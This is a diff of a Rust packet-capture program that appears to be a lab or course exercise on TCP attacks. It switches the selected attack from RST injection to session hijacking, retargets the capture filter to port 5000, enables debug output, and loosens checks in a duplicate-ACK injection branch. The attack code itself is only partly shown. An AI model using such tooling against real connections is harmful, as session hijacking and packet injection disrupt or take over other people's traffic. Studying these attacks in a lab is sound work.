@@ -22,36 +22,24 @@ fn main() {
         device_ip,
     } = OsInfo::fetch().expect("os fetch error");
 
-    let attack_type = &AttackType::RSTInjection;
+    let attack_type = &AttackType::SessionHijack;
 
     let mut cap = get_capture(interface.as_str());
     let mut send_cap = get_capture(interface.as_str());
 
-    // similar syntax to wireshark (BPF)
-    // some examples:
-    //
-    // no filter: empty string
-    // experimental protocol: ip protochain 253
-    // TCP protocol: tcp
-    let filter = "tcp and host 90.130.70.73";
-    cap.filter(filter, true).expect("filter error");
+    let task2Filter = "tcp and host 90.130.70.73";
+    let task3Filter = "tcp and port 5000";
+
+    cap.filter(task3Filter, true).expect("filter error");
 
     println!("listening on interface {} for packets...", interface);
-
-    // start sending packets in a separate thread
-
-    /*
-    thread::spawn(move || {
-        test_sending_packets(interface.as_str());
-    });
-    */
 
     // listen to incoming packets
     loop {
         let latest_ack: AtomicU32 = AtomicU32::new(0);
         match cap.next_packet() {
             Ok(packet) => {
-                //println!("captured a packet");
+                println!("captured a packet");
 
                 let parse_res = parse_packet_to_tcp(packet.data);
 
@@ -84,7 +72,7 @@ fn main() {
     }
 }
 
-/**
+/*
 Parses the raw packet to a TCP packet object
 Returns an error if the frame is not Ethernet(IPv4(TCP))
 */
@@ -97,13 +85,13 @@ fn parse_packet_to_tcp(
             if ether_type == EtherType::IPV4 {
                 match Ipv4Header::from_slice(ethernet_bytes) {
                     Ok((ipv4_header, ipv4_bytes)) => {
-                        //println!("ipv4 packet captured");
+                        println!("ipv4 packet captured");
 
                         let protocol = ipv4_header.protocol;
                         match protocol {
                             IpNumber::TCP => match TcpHeader::from_slice(ipv4_bytes) {
                                 Ok((tcp_header, tcp_bytes)) => {
-                                    //println!("tcp packet captured: {:?}", tcp_bytes);
+                                    println!("tcp packet captured: {:?}", tcp_bytes);
 
                                     Ok((ethernet_header, ipv4_header, tcp_header, tcp_bytes))
                                 }
@@ -159,20 +147,10 @@ fn perform_hack(
         }
 
         AttackType::DuplicateAck => {
-            
-            //if tcp_header.acknowledgment_number  <= latest_ack.load(Ordering::Relaxed) {
-            //    return;
-            //}
 
             if payload.is_empty(){
                 return;
             }
-
-            if tcp_header.source_port != 80{
-                return;
-            }
-
-            //latest_ack.store(tcp_header.acknowledgment_number, Ordering::Relaxed);
 
             // No need for a payload, since ACK packets don't carry any data
             let empty_payload = &[];
